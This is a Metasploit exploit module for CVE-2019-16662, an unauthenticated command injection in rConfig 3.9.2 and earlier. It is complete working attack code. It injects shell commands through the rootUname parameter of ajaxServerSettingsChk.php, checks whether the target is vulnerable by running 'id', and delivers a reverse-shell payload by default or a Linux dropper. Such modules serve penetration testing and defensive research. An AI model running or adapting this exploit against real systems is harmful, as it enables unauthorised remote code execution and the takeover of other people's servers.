# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;rConfig install Command Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an unauthenticated command injection vulnerability
        in rConfig versions 3.9.2 and prior. The `install` directory is not
        automatically removed after installation, allowing unauthenticated users
        to execute arbitrary commands via the `ajaxServerSettingsChk.php` file
        as the web server user.

        This module has been tested successfully on rConfig version 3.9.2 on
        CentOS 7.7.1908 (x64).
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;mhaskar&#039;, # Discovery and exploit
          &#039;bcoles&#039;   # Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2019-16662&#039;],
          [&#039;EDB&#039;, &#039;47555&#039;],
          [&#039;URL&#039;, &#039;https://gist.github.com/mhaskar/ceb65fa4ca57c3cdccc1edfe2390902e&#039;],
          [&#039;URL&#039;, &#039;https://shells.systems/rconfig-v3-9-2-authenticated-and-unauthenticated-rce-cve-2019-16663-and-cve-2019-16662/&#039;]
        ],
      &#039;Platform&#039;       => %w[unix linux],
      &#039;Arch&#039;           => [ARCH_CMD, ARCH_X86, ARCH_X64],
      &#039;Payload&#039;        => {&#039;BadChars&#039; => "\x00\x0a\x0d\x26"},
      &#039;Targets&#039;        =>
        [
          [&#039;Automatic (Unix In-Memory)&#039;,
            &#039;Platform&#039;       => &#039;unix&#039;,
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;DefaultOptions&#039; => {&#039;PAYLOAD&#039; => &#039;cmd/unix/reverse&#039;},
            &#039;Type&#039;           => :unix_memory
          ],
          [&#039;Automatic (Linux Dropper)&#039;,
            &#039;Platform&#039;       => &#039;linux&#039;,
            &#039;Arch&#039;           => [ARCH_X86, ARCH_X64],
            &#039;Type&#039;           => :linux_dropper
          ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DefaultOptions&#039; => { &#039;SSL&#039; => true, &#039;RPORT&#039; => 443 },
      &#039;DisclosureDate&#039; => &#039;2019-10-28&#039;,
      &#039;DefaultTarget&#039;  => 0))
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to rConfig install directory&#039;, &#039;/install/&#039;])
      ])
  end

  def check
    res = execute_command(&#039;id&#039;)

    unless res
      vprint_error &#039;Connection failed&#039;
      return CheckCode::Unknown
    end

    if res.code == 404
      vprint_error &#039;Could not find install directory&#039;
      return CheckCode::Safe
    end

    cmd_res = res.body.scan(%r{The root details provided have not passed: (.+?)<\\/}).flatten.first

    unless cmd_res
      return CheckCode::Safe
    end

    vprint_status "Response: #{cmd_res}"

    unless cmd_res.include?(&#039;uid=&#039;)
      return CheckCode::Detected
    end

    CheckCode::Vulnerable
  end

  def execute_command(cmd, opts = {})
    vprint_status "Executing command: #{cmd}"
    send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/lib/ajaxHandlers/ajaxServerSettingsChk.php&#039;),
      &#039;vars_get&#039; => {&#039;rootUname&#039; => ";#{cmd} #"}
    }, 5)
  end

  def exploit
    unless [CheckCode::Detected, CheckCode::Vulnerable].include? check
      fail_with Failure::NotVulnerable, "#{peer} - Target is not vulnerable"
    end

    case target[&#039;Type&#039;]
    when :unix_memory
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager(:linemax => 1_500)
    end
  end
end

